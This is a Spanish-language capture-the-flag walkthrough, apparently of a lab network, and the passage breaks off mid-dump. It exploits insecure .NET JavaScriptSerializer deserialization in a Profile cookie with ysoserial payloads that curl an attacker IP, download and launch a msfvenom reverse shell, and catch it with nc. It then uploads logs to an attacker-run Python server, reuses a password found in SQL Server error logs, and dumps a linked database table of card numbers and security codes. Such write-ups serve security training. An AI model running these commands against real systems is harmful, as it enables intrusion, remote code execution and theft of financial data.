Veremos varios archivos interesantes, pero de todos ellos si investigamos muchos de ellos nos llamara uno la atencion el `Database.cs`.

```cs
using System.Data.SqlClient;

namespace WebApplication {
    public class Database {

        public static string IPAddress { get; } = @"WEB\WEBDB";
        public static string UserID { get; } = "webappusr";
        public static bool Encrypt { get; } = true;
        public static bool TrustServerCertificate { get; } = true;

        private static string Password { get; } = <OBFUSCATED>;

        public static string ConnectionString {
            get {
                SqlConnectionStringBuilder builder = new SqlConnectionStringBuilder {
                    DataSource = IPAddress,
                    UserID = UserID,
                    Password = Password,
                    Encrypt = true,
                    TrustServerCertificate = true,
                    InitialCatalog = "webapp"
                };

                return builder.ConnectionString;
            }
        }
    }
}
```

Por lo que vemos aqui tenemos a medias las credenciales de `SQL`, la contraseña se almacena en el binario que se llama para ejecutar este `Database`, lo que podemos hacer es decompilar dicho binario para poder obtener la contraseña.

* **Servidor:** `WEB\WEBDB` (instancia MSSQL)
* **Usuario:** `webappusr`
* **Contraseña:** `<OBFUSCATED>` (pero está en el binario compilado)
* **Base de datos:** `webapp`

### Deserialización insegura (JAVA)

Pero si investigamos mucho por esta via no encontraremos nada, despues de estar revisando muchos archivos veremos uno mucho mas interesante que el anterior llamado `_ViewStart.cshtml` que contiene lo siguiente.

```cs
@{
    Layout = "~/Views/Shared/_Layout.cshtml";
}

@using System.Text;
@using System.Web.Script.Serialization;
@{
    if (0 != Context.Session.Keys.Count) {
        if (null != Context.Request.Cookies.Get("Profile")) {
            try {
                byte[] data = Convert.FromBase64String(Context.Request.Cookies.Get("Profile")?.Value);
                string str = UTF8Encoding.UTF8.GetString(data);

                SimpleTypeResolver resolver = new SimpleTypeResolver();
                JavaScriptSerializer serializer = new JavaScriptSerializer(resolver);

                object obj = (serializer.Deserialize(str, typeof(object)) as Profile);
                // TODO: create profile to change the language and font of the website
            } catch (Exception e) {
            }
        }
    }
}
```

En este codigo podemos ver una **vulnerabilidad de deserialización insegura**.

1. **`JavaScriptSerializer` con `SimpleTypeResolver`**
   * `SimpleTypeResolver` permite la creación de **cualquier tipo** durante la deserialización
   * Esto significa que un atacante puede deserializar objetos maliciosos
2. **Deserialización desde una cookie**
   * La cookie `Profile` en Base64 se deserializa automáticamente
   * No hay validación del contenido antes de deserializar
3. **El bloque try-catch vacío**
   * Cualquier excepción es silenciosamente ignorada
   * Esto puede ocultar intentos de explotación

Un atacante puede crear una cookie `Profile` con Base64 que contenga un payload serializado para:

* **Ejecución de comandos** usando `System.Diagnostics.Process`
* **Lectura/escritura de archivos**
* **Carga de ensamblados maliciosos**

Vamos a utilizar la herramienta `ysoserial` para poder codificar nuestro `payload` en `java` y añadirlo al valor de la `Cookie` llamada `Profile` que crearemos desde el `Storage` del navegador.

URL = [ysoserial v1.35 Download](https://github.com/pwntester/ysoserial.net/releases/download/v1.35/ysoserial-1.35.zip)

Una vez que nos lo descarguemos, lo descomprimimos y abrimos una terminal en `PowerShell` en un sistema `Windows` para que esto funcione.

```powershell
cd ysoserial-1.35\Release\
.\ysoserial.exe -f JavaScriptSerializer -o base64 -g ObjectDataProvider -c "cmd /c curl http://<IP_ATTACKER>/"
```

Info:

```
ew0KICAgICdfX3R5cGUnOidTeXN0ZW0uV2luZG93cy5EYXRhLk9iamVjdERhdGFQcm92aWRlciwgUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNScsIA0KICAgICdNZXRob2ROYW1lJzonU3RhcnQnLA0KICAgICdPYmplY3RJbnN0YW5jZSc6ew0KICAgICAgICAnX190eXBlJzonU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODknLA0KICAgICAgICAnU3RhcnRJbmZvJzogew0KICAgICAgICAgICAgJ19fdHlwZSc6J1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgICAgICdGaWxlTmFtZSc6J2NtZCcsICdBcmd1bWVudHMnOicvYyBjbWQgL2MgY3VybCBodHRwOi8vMTAuMTAuMTQuMTA1LycNCiAgICAgICAgfQ0KICAgIH0NCn0=
```

Ahora vamos a crear la `Cookie` llamada `Profile` y añadiendole el `Base64` en el valor como indica en el codigo quedando de esta forma:

<figure><img src="../../.gitbook/assets/Pasted image 20260102140343.png" alt=""><figcaption></figcaption></figure>

Antes de recargar la pagina para que se ejecute, nos pondremos a la escucha con un servidor de `python3` de esta forma:

```shell
python3 -m http.server 80
```

Ahora si recargamos la pagina principal y volvemos a donde tenemos la escucha, veremos lo siguiente:

```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.13.37.12 - - [03/Jan/2026 09:36:56] "GET / HTTP/1.1" 200 -
```

Veremos que ha funcionado, nos llego una peticion a nuestro servidor, por lo que vamos a establecer una `reverse shell` ya que por lo que vemos realizamos un `RCE`.

***

> NOTA IMPORTANTE:

En tal caso de que nos os funcione el tema de la `Cookie` es importante que esteis logueados con el usuario `jay.teignton:admin` ya que de lo contrario no funcionara, recargar la pagina en el apartado `Management` para mas seguridad.

***

Primero crearemos un archivo que cuando se ejecute establezca una conexion con nuestra maquina atacante, probaremos de primeras con `msfvenom` a ver si no tienen el `Windows Defender` activado para que lo detecte.

```shell
msfvenom -p windows/x64/powershell_reverse_tcp LHOST=<IP_ATTACKER> LPORT=<PORT> -f exe -o shell.exe
```

Info:

```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 1889 bytes
Final size of exe file: 8704 bytes
Saved as: shell.exe
```

Ahora estando en el mismo directorio dejaremos abierto ese servidor de `python3` para que se lo pueda descargar a traves del mismo.

Vamos a codificar el siguiente `payload` de esta forma:

```powershell
.\ysoserial.exe -f JavaScriptSerializer -o base64 -g ObjectDataProvider -c "cmd /c curl http://<IP_ATTACKER>/shell.exe -o C:\Windows\Temp\shell.exe"
```

Info:

```
ew0KICAgICdfX3R5cGUnOidTeXN0ZW0uV2luZG93cy5EYXRhLk9iamVjdERhdGFQcm92aWRlciwgUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNScsIA0KICAgICdNZXRob2ROYW1lJzonU3RhcnQnLA0KICAgICdPYmplY3RJbnN0YW5jZSc6ew0KICAgICAgICAnX190eXBlJzonU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODknLA0KICAgICAgICAnU3RhcnRJbmZvJzogew0KICAgICAgICAgICAgJ19fdHlwZSc6J1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgICAgICdGaWxlTmFtZSc6J2NtZCcsICdBcmd1bWVudHMnOicvYyBjbWQgL2MgY3VybCAxMC4xMC4xNC4xMDUvc2hlbGwuZXhlIC1vIEM6XFxXaW5kb3dzXFxUZW1wXFxzaGVsbC5leGUnDQogICAgICAgIH0NCiAgICB9DQp9
```

Ahora modificaremos el valor de la `Cookie` de `Profile` con este otro `base64`, hecho eso si recargamos la pagina en el servidor de `python3` veremos lo siguiente:

```
10.13.37.12 - - [03/Jan/2026 09:44:33] "GET /shell.exe HTTP/1.1" 200 -
```

Veremos que lo ha descargado de forma correcta, ahora por ultimo tendremos que ejecutar el archivo, por lo que codificaremos este otro `Base64`.

```powershell
.\ysoserial.exe -f JavaScriptSerializer -o base64 -g ObjectDataProvider -c "cmd /c C:\Windows\Temp\shell.exe"
```

Info:

```
ew0KICAgICdfX3R5cGUnOidTeXN0ZW0uV2luZG93cy5EYXRhLk9iamVjdERhdGFQcm92aWRlciwgUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNScsIA0KICAgICdNZXRob2ROYW1lJzonU3RhcnQnLA0KICAgICdPYmplY3RJbnN0YW5jZSc6ew0KICAgICAgICAnX190eXBlJzonU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODknLA0KICAgICAgICAnU3RhcnRJbmZvJzogew0KICAgICAgICAgICAgJ19fdHlwZSc6J1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgICAgICdGaWxlTmFtZSc6J2NtZCcsICdBcmd1bWVudHMnOicvYyBjbWQgL2MgQzpcXFdpbmRvd3NcXFRlbXBcXHNoZWxsLmV4ZScNCiAgICAgICAgfQ0KICAgIH0NCn0=
```

Ahora si modificamos otra vez el valor de la `Cookie` con este `base64`, pero antes de recargar la pagina nos ponemos a la escucha.

```shell
nc -lvnp <PORT>
```

Si recargamos la pagina y volvemos a donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [10.10.14.105] from (UNKNOWN) [10.13.37.12] 23949
Windows PowerShell running as user web_user on WEB
Copyright (C) Microsoft Corporation. All rights reserved.

whoami
teignton\web_user
PS C:\Windows\system32>
```

Veremos que ha funcionado, por lo que seremos el usuario `web_user` y tambien podremos leer la siguiente `flag` que se encuentra en la carpeta `Public` de `Users`.

> Is it a bird? Is it a plane? (Flag)

```
CONTEXT{uNs4fe_deceri4liz3r5?!_th33333yre_gr8}
```

## This looks bad!

Vamos a crear un `ZIP` de todo el directorio actual y pasarlo a otra carpeta para posteriormente transferirlo a nuestra maquina atacante.

```powershell
cd C:\Logs
Compress-Archive -Path C:\Logs\* -DestinationPath C:\Windows\Temp\all_logs.zip -Force
```

Una vez que hayamos generado el archivo, vamos a pasarnoslo a nuestra maquina atacante de esta forma:

```powershell
(New-Object System.Net.WebClient).UploadFile('http://<IP_ATTACKER>:8000/', 'C:\Windows\Temp\all_logs.zip')
```

Antes de ejecutar lo de antes, vamos a montarnos un pequeños script que permita la obtencion de archivos a traves de `POST`.

> get\_file.py

```python
from http.server import HTTPServer, BaseHTTPRequestHandler
import cgi
import os

class UploadHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Server ready for uploads')

    def do_POST(self):
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)

            # Guardar archivo
            filename = 'all_logs.zip'
            with open(filename, 'wb') as f:
                f.write(post_data)

            print(f"[+] Archivo recibido: {filename}")

            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'Upload successful')

        except Exception as e:
            print(f"[-] Error: {e}")
            self.send_response(500)
            self.end_headers()

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 8000), UploadHandler)
    print('Servidor en puerto 8000...')
    server.serve_forever()
```

Esto lo ejecutaremos de esta forma quedandonos a la escucha de cualquier peticion `POST`:

```shell
python3 get_file.py
```

Ahora si enviamos lo del `PowerShell` y volvemos a donde tenemos nuestro servidor a la escucha, veremos lo siguiente:

```
Servidor en puerto 8000...
[+] Archivo recibido: all_logs.zip
10.13.37.12 - - [03/Jan/2026 10:21:26] "POST / HTTP/1.1" 200 -
```

Veremos que ha funcionado, por lo que vamos a descomprimirlo.

```shell
unzip all_logs.zip
```

Ahora si listamos, veremos lo siguiente:

```
drwxr-xr-x root root 4.0 KB Sat Jan  3 10:21:52 2026 .
drwxr-xr-x root root 4.0 KB Sat Jan  3 10:21:38 2026 ..
drwxr-xr-x root root 4.0 KB Sat Jan  3 10:21:43 2026 W3SVC1
drwxr-xr-x root root 4.0 KB Sat Jan  3 10:21:43 2026 WEBDB
```

Ha funcionado, por lo que vamos analizar dichos `logs` a ver que vemos.

Despues de una larga investigacion, veremos que en los archivos de `WEBDB` que esta relacionado con la base de datos, hay archivos binarios o algo parecido, por lo que vamos a pasarlos a `UTF-8` para poder leerlo y filtrarlo mejor.

```shell
iconv -f UTF-16LE -t UTF-8 WEBDB/ERRORLOG -o /tmp/errorlog_conv.txt 2>/dev/null
iconv -f UTF-16LE -t UTF-8 WEBDB/ERRORLOG.1 -o /tmp/errorlog1_conv.txt 2>/dev/null
```

Ahora vamos a leer dichos archivos y filtrarlo por posibles contraseñas que pueda haber...

```shell
cat /tmp/errorlog_conv.txt /tmp/errorlog1_conv.txt 2>/dev/null | grep -i -E "(password|pwd|pass|login failed|18456|authentication)" -B2 -A2
```

Veremos unas cuantas lineas interesantes...

```
...........................<RESTO_DE_CODIGO>.......................................
2020-04-30 15:40:08.88 Logon       Error: 18456, Severity: 14, State: 6.
2020-04-30 15:40:08.88 Logon       Login failed for user 'TEIGNTON\karl.memaybe'. Reason: Attempting to use an NT account name with SQL Server Authentication. [CLIENT: <local machine>]
2020-04-30 15:40:15.67 Logon       Error: 18456, Severity: 14, State: 5.
2020-04-30 15:40:15.67 Logon       Login failed for user 'B6rQx_d&RVqvcv2A'. Reason: Could not find a login matching the name provided. [CLIENT: <local machine>]
...........................<RESTO_DE_CODIGO>.......................................
```

Por lo que estamos viendo ahi, alguien intento utilizar como usuario lo que parece ser una posible contraseña `B6rQx_d&RVqvcv2A`, tambien vemos que encima esta el usuario `karl.memaybe`, por descarte de usuarios nos quedaria el `webappusr`, `Administrator` y el que mencione anteriormente, si probamos de primeras con `karl.memaybe` por `MSSQL` veremos lo siguiente:

```shell
impacket-mssqlclient karl.memaybe:'B6rQx_d&RVqvcv2A'@<IP> -windows-auth
```

Info:

```
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WEB\WEBDB): Line 1: Changed database context to 'master'.
[*] INFO(WEB\WEBDB): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019  (15.0.2070)
[!] Press help for extra shell commands
SQL (TEIGNTON\karl.memaybe  guest@master)>
```

Veremos que hemos accedido de forma correcta, si investigamos un poco veremos lo siguiente:

```sql
EXEC sp_linkedservers;
```

Info:

```
SRV_NAME      SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE   SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT
-----------   ----------------   -----------   --------------   ------------------   ------------   -------
WEB\CLIENTS   SQLNCLI            SQL Server    WEB\CLIENTS      NULL                 NULL           NULL
WEB\WEBDB     SQLNCLI            SQL Server    WEB\WEBDB        NULL                 NULL           NULL
```

Vemos que tenemos linkeada otra `DDBB` que en este caso se llama `CLIENTS`, vamos a probar a listar las `DDBBs` que contiene:

```sql
SELECT * FROM OPENQUERY([WEB\CLIENTS], 'SELECT name FROM sys.databases');
```

Info:

```
name
-------
master
tempdb
model
msdb
clients
```

Veremos varias interesantes, pero entre ellas nos llama la atencion la de `Clients`, por lo que vamos a listar sus tablas.

```sql
SELECT * FROM OPENQUERY([WEB\CLIENTS], 'SELECT TABLE_NAME FROM clients.INFORMATION_SCHEMA.TABLES');
```

Info:

```
TABLE_NAME
------------
card_details
```

Solamente veremos una, vamos a ver que contiene dicha tabla:

```sql
SELECT * FROM OPENQUERY([WEB\CLIENTS], 'SELECT * FROM clients.dbo.card_details');
```

Info:

```
name                                        company                   email                                 card_number                        security_code
-----------------------------------------   -----------------------   -----------------------------------   --------------------------------   ---------------------------
b'Nicholas Vincent'                         b'Fletcher'               b' Stark and Hayes'                   b'tammy94@yahoo.com'               b'675919323062,442'
b'Shannon Forbes'                           b'Cordova'                b' Hunt and Murphy'                   b'anna94@yahoo.com'                b'4869626801314,711'
b'Natalie Zhang'                            b'Richardson'             b' Evans and Miles'                   b'kyle92@gmail.com'                b'4650283842902,168'
b'James Gonzalez'                           b'Wilson-Richardson'      b'cwalker@hotmail.com'                b'2243920565805464'                b'331'
b'Terry Bates'                              b'Schmidt-Clark'          b'pfitzpatrick@gmail.com'             b'3557871891007903'                b'699'
b'Amy Good'                                 b'Ellison'                b' Roberts and Morton'                b'snguyen@gmail.com'               b'2233858123202232,972'
b'Brittney Mendez'                          b'Francis-Logan'          b'robert46@hotmail.com'               b'30016928069822'                  b'672'
b'Mr. Sean Roberson'                        b'Ho Ltd'                 b'rbarber@hotmail.com'                b'630477345148'                    b'245'
b'Ian Carter'                               b'Campbell'               b' Parks and Lam'                     b'lisaherring@yahoo.com'           b'4924035332415299,485'
b'Steven Wong'                              b'Norton-Rhodes'          b'smithjill@gmail.com'                b'3577362627664320'                b'9087'
b'Amy Hood'                                 b'Hamilton'               b' Kerr and Williams'                 b'johnbrown@hotmail.com'           b'639033626065,501'
b'Brian Walls'                              b'Edwards Inc'            b'yowens@yahoo.com'                   b'630405945357'                    b'6383'
b'David Greer'                              b'Clark-Becker'           b'smithryan@yahoo.com'                b'2720280296307260'                b'852'
b'Nathan Pham'                              b'Swanson and Sons'       b'tking@hotmail.com'                  b'374466056634349'                 b'244'
b'Scott Carr'                               b'Berry and Sons'         b'nicole31@hotmail.com'               b'3501518635309288'                b'216'
b'Stephanie Gonzales'                       b'Bowman and Sons'        b'bobbyreyes@gmail.com'               b'501868695633'                    b'619'
b'Morgan Johnson'                           b'Tyler'                  b' Rangel and Dyer'                   b'andersonwilliam@hotmail.com'     b'4158810303406487033,202'
b'Victoria Black'                           b'Walsh and Sons'         b'fschultz@hotmail.com'               b'180009151439943'                 b'009'
b'Amy Ross'                                 b'Stone'                  b' Bass and Jordan'                   b'larry40@gmail.com'               b'213101341307360,279'
b'Kimberly Turner'                          b'Jones Inc'              b'martinsteven@yahoo.com'             b'4044504614817484689'             b'984'
b'Elizabeth Rivera'                         b'Davila'                 b' Cannon and Hampton'                b'sandyhernandez@hotmail.com'      b'180010957521553,095'
b'Francisco Aguirre'                        b'Johnson'                b' Calderon and Gonzalez'             b'jacoblawrence@yahoo.com'         b'4732410241674355,187'
b'Teresa Wright'                            b'Calderon'               b' Campbell and Dillon'               b'fgarrett@gmail.com'              b'180025382425097,859'
b'Matthew Carrillo'                         b'Knapp-Rios'             b'hcain@yahoo.com'                    b'6515751989257111'                b'529'
b'Tracy Grant'                              b'Sharp-Wright'           b'seanbrown@yahoo.com'                b'213191487358046'                 b'471'
b'Michael Rosales'                          b'Harris and Sons'        b'ricardoramirez@hotmail.com'         b'4438142818686838'                b'869'
b'Kevin Travis'                             b'Edwards-Williams'       b'dakota69@yahoo.com'                 b'6572804529727471'                b'940'
b'Carla Andrews'                            b'Norman Group'           b'justinking@yahoo.com'               b'676308670394'                    b'063'
b'Lisa Alvarez'                             b'Robinson-Jenkins'       b'wpineda@hotmail.com'                b'4712966063787025'                b'102'
b'Jacqueline Mason'                         b'Booth-Gilbert'          b'benjaminhouse@gmail.com'            b'4106268621155967'                b'574'
b'Susan Lee'                                b'Sanford-Butler'         b'rdavis@gmail.com'                   b'180054642207327'                 b'811'
b'Jon Copeland'                             b'Larson LLC'             b'michaelramirez@yahoo.com'           b'342619462448063'                 b'962'
b'Anna Mason'                               b'Howard-Walsh'           b'fieldselizabeth@hotmail.com'        b'349206430410459'                 b'791'
b'Diana Smith'                              b'Campbell-Mccullough'    b'karen17@hotmail.com'                b'4553397027873788'                b'717'
b'Dustin Newman'                            b'Bauer LLC'              b'ssullivan@hotmail.com'              b'3595785888728715'                b'684'
b'Courtney Stevens'                         b'Martin'                 b' Morgan and Barnes'                 b'kimberlymcintyre@yahoo.com'      b'4152551934348266329,448'
b'Debbie Sanchez'                           b'Greer Group'            b'elizabethpittman@hotmail.com'       b'180009056598694'                 b'268'
b'Brittney Hamilton'                        b'Weaver Ltd'             b'donnafuller@gmail.com'              b'340167160129884'                 b'096'
b'Rachel Thomas'                            b'Williams'               b' Parker and Gillespie'              b'oadams@hotmail.com'              b'180094837950117,473'
b'Nicole Carter'                            b'Joseph LLC'             b'stevenoneal@yahoo.com'              b'4059132861065'                   b'0123'
b'Stacie Carter'                            b'Miller'                 b' Lopez and Cowan'                   b'jacqueline00@gmail.com'          b'375625535962212,125'
b'Matthew Cox'                              b'Scott and Sons'         b'egomez@hotmail.com'                 b'213182036124641'                 b'329'
b'Crystal Stout'                            b'Spencer'                b' Young and Davis'                   b'calderonchristina@yahoo.com'     b'345096591199890,725'
b'Laura White'                              b'Coleman'                b' Barton and Nguyen'                 b'brooke21@gmail.com'              b'4433276624344318,578'
b'Nicholas Wilson'                          b'Hamilton-Caldwell'      b'suzanne71@gmail.com'                b'4885914882501'                   b'848'
b'Kimberly Freeman'                         b'Murray'                 b' Willis and Vance'                  b'dgriffin@hotmail.com'            b'4662820405282688292,391'
b'Tanya Swanson'                            b'Cochran and Sons'       b'austin11@gmail.com'                 b'213162418319670'                 b'424'
b'John Perry'                               b'Smith-Allen'            b'jessica53@hotmail.com'              b'3539587603000142'                b'506'
b'Marissa Alvarez'                          b'Marsh-Chandler'         b'wyattmay@hotmail.com'               b'30229599661542'                  b'639'
b'Christine Barry'                          b'Barton Inc'             b'lambtyler@gmail.com'                b'6597493730708826'                b'778'
b'Julie Stephenson'                         b'Thornton Inc'           b'kathleenmolina@hotmail.com'         b'4750246605982886'                b'7362'
b'Kenneth Hill'                             b'Townsend'               b' Hardy and Cummings'                b'kevinhendricks@yahoo.com'        b'568075190831,525'
b'Alexander Patel'                          b'Mason'                  b' Lawrence and King'                 b'mquinn@hotmail.com'              b'213156335217520,027'
b'Michelle Hill'                            b'Smith-Mathews'          b'jenniferwade@gmail.com'             b'3572911253139547'                b'951'
b'Emily Chung'                              b'Nguyen-Smith'           b'amyharris@hotmail.com'              b'4853716657867269755'             b'455'
b'Ana Wright'                               b'Jones-Hawkins'          b'christiancollins@hotmail.com'       b'4525012609352'                   b'745'
b'Kimberly Gonzalez'                        b'Erickson'               b' Maynard and Young'                 b'osmith@yahoo.com'                b'30332702781973,699'
b'Mark Estrada'                             b'Rose'                   b' Hughes and Adkins'                 b'stevenpatterson@yahoo.com'       b'345362003739669,055'
...............................<RESTO DE INFO>.....................................
```

Hay excesiva informacion la cual puede ser muy interesantes, vamos a filtrarla un poco para ver menos, pero que pueda seguir siendo interesante:

```sql
SELECT * FROM OPENQUERY([WEB\CLIENTS], 'SELECT * FROM clients.dbo.card_details WHERE card_number LIKE ''%[A-Za-z]%'' OR security_code LIKE ''%[A-Za-z]%''');
```

Info:

```
..............................<RESTO_DE_INFO>......................................
b'CONTEXT{g1mm2_g1mm3_g1mm4_y0ur_cr3d1t}'   b'Burns'        b' Bates and Marshall'          b'spencer38@gmail.com'             b'4181190870180348,888'
..............................<RESTO_DE_INFO>......................................
```

Entre toda la informacion podremos ver la `flag` que estaba por ahi como nombre del usuario `Burns`.

> This looks bad! (Flag)

```
CONTEXT{g1mm2_g1mm3_g1mm4_y0ur_cr3d1t}
```

## It's not a backdoor, it's a feature

Si investigamos un poco veremos que en la base de datos `Clients` hay archivos en `assembly_files`, vamos a ver cunatos y con que nombre estan.

```sql
SELECT * FROM OPENQUERY([WEB\CLIENTS], 'SELECT COUNT(*) as file_count FROM clients.sys.assembly_files');
SELECT * FROM OPENQUERY([WEB\CLIENTS], 'SELECT name, file_id, assembly_id FROM clients.sys.assembly_files');
```

Info:

```
file_count
----------
         2
name                                               file_id   assembly_id
------------------------------------------------   -------   -----------
microsoft.sqlserver.types.dll                            1             1
C:\Users\Administrator\Scripts\clientsbackup.dll         1         65536
```

Veremos que hay `2` archivos, pero uno de ellos es el mas interesante, vemos que hay una `DLL` custom llamada `clientsbackup.dll` en la carpeta del `Administrator`, por lo que vamos a descargarnos el archivo a nuestra maquina atacante, para ello haremos lo siguiente:

Lo que vamos hacer basicamente es extraer la informacion de la `DLL` y codificarla en `Base64` para posteriormente en nuestro `kali` pasarla a un archivo, decodificarlo y que pille el formato de `DLL`.

```sql
SELECT CAST(N'' AS XML).value('xs:base64Binary(sql:column("content"))','VARCHAR(MAX)') as base64_dll FROM OPENQUERY([WEB\CLIENTS], 'SELECT content FROM clients.sys.assembly_files WHERE name = ''C:\Users\Administrator\Scripts\clientsbackup.dll''');
```

Info:

```
base64_dll
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
b'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